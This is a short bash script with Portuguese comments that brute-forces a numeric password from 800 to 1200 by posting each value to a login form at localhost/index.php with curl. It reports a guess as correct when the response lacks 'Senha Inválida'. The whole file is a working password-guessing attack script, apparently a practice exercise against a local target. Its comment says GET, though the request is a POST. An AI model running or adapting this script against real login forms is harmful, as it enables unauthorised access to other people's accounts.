#!/bin/bash
#Brute-force com GET

retorno="Senha Inválida"

for i in {800..1200}
do

dados=$(curl -s http://localhost/index.php -X POST -d "senha=$i"| grep "Senha Inválida" | sed 's/<!DOCTYPE html>//')

if [ "$retorno" != "$dados" ] 
then
echo "Senha correta é: " $i
fi
 
done
